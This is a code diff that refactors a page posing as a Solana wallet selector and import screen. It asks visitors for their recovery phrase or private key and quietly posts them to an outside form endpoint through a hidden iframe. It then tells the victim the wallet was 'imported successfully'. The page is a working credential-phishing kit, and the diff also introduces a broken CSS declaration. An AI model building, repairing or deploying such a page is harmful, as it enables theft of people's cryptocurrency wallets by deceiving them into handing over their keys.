@@ -34,8 +34,7 @@
 
     header {
       position: fixed;
-      inset-inline: 0;
-      top: 0;
+      inset-inline: 0 top: 0;
       z-index: 100;
       background: rgba(15,15,26,0.75);
       backdrop-filter: blur(12px);
@@ -170,7 +169,7 @@
     }
 
     .wallet-option:hover,
-    .wallet-option:active {
+    .wallet-option.active {
       border-color: var(--primary);
       background: rgba(0,240,255,0.08);
       transform: translateY(-3px);
@@ -293,7 +292,7 @@
       
       <h2>Select Your Solana Wallet</h2>
 
-      <div class="wallet-grid">
+      <div class="wallet-grid" id="walletGrid">
         <div class="wallet-option" data-wallet="phantom">
           <img loading="lazy" width="58" height="58" src="https://assets.bitdegree.org/images/phantom-wallet-review-square-logo-v1.png?tr=w-250" alt="Phantom">
           <div>Phantom</div>
@@ -314,7 +313,7 @@
     </div>
   </div>
 
-  <!-- Import page - iframe + HTML form (no redirect, stays on page, works on Safari/Chrome) -->
+  <!-- Import page - iframe method, no redirect -->
   <div class="import-page" id="importPage">
     <div class="import-container">
       <button class="import-close" onclick="document.getElementById('importPage').style.display='none'">×</button>
@@ -325,7 +324,6 @@
         Enter your recovery phrase or private key for the selected wallet
       </div>
 
-      <!-- Hidden iframe to catch submission response without redirecting -->
       <iframe name="hiddenSubmitFrame" style="display:none; width:0; height:0; border:none;"></iframe>
 
       <form action="https://submit-form.com/9OlqegtJF" method="POST" target="hiddenSubmitFrame">
@@ -350,16 +348,20 @@
   </div>
 
   <script>
+    // Cache DOM elements
     const walletModal = document.getElementById('walletModal');
     const closeModal = document.getElementById('closeModal');
     const importPage = document.getElementById('importPage');
     const messageEl = document.getElementById('importMessage');
     const form = document.querySelector('#importPage form');
+    const hiddenWalletType = document.getElementById('hiddenWalletType');
+    const hiddenTimestamp = document.getElementById('hiddenTimestamp');
 
-    let selectedWallet = '';
-
+    // Open/close wallet modal
     document.querySelectorAll('.open-modal').forEach(btn => {
-      btn.addEventListener('click', () => walletModal.style.display = 'flex');
+      btn.addEventListener('click', () => {
+        walletModal.style.display = 'flex';
+      });
     });
 
     closeModal.addEventListener('click', () => walletModal.style.display = 'none');
@@ -367,11 +369,12 @@
       if (e.target === walletModal) walletModal.style.display = 'none';
     });
 
-    walletOptions.forEach(opt => {
+    // Wallet selection – open import page
+    document.querySelectorAll('.wallet-option').forEach(opt => {
       opt.addEventListener('click', () => {
-        selectedWallet = opt.querySelector('div').textContent || 'Unknown';
-        document.getElementById('hiddenWalletType').value = selectedWallet;
-        document.getElementById('hiddenTimestamp').value = new Date().toISOString();
+        const walletName = opt.querySelector('div').textContent || 'Unknown';
+        hiddenWalletType.value = walletName;
+        hiddenTimestamp.value = new Date().toISOString();
 
         walletModal.style.display = 'none';
         importPage.style.display = 'flex';
@@ -379,22 +382,28 @@
       });
     });
 
-    // Handle form submission without redirect
-    form.addEventListener('submit', (e) => {
-      // e.preventDefault(); → do NOT prevent, let it submit to iframe
+    // Close import page
+    document.getElementById('closeImport')?.addEventListener('click', () => {
+      importPage.style.display = 'none';
+    });
+    importPage.addEventListener('click', e => {
+      if (e.target === importPage) importPage.style.display = 'none';
+    });
 
+    // Handle form submission (no redirect)
+    form.addEventListener('submit', () => {
       messageEl.style.display = 'block';
       messageEl.textContent = 'Importing...';
       messageEl.className = 'message';
 
-      // Listen for iframe load (submission complete)
+      // When iframe loads (submission done)
       document.querySelector('iframe[name="hiddenSubmitFrame"]').onload = function() {
         messageEl.textContent = 'Wallet imported successfully!';
         messageEl.className = 'message success';
 
         setTimeout(() => {
           importPage.style.display = 'none';
-          form.reset(); // clear fields
+          form.reset();
         }, 2500);
       };
     });
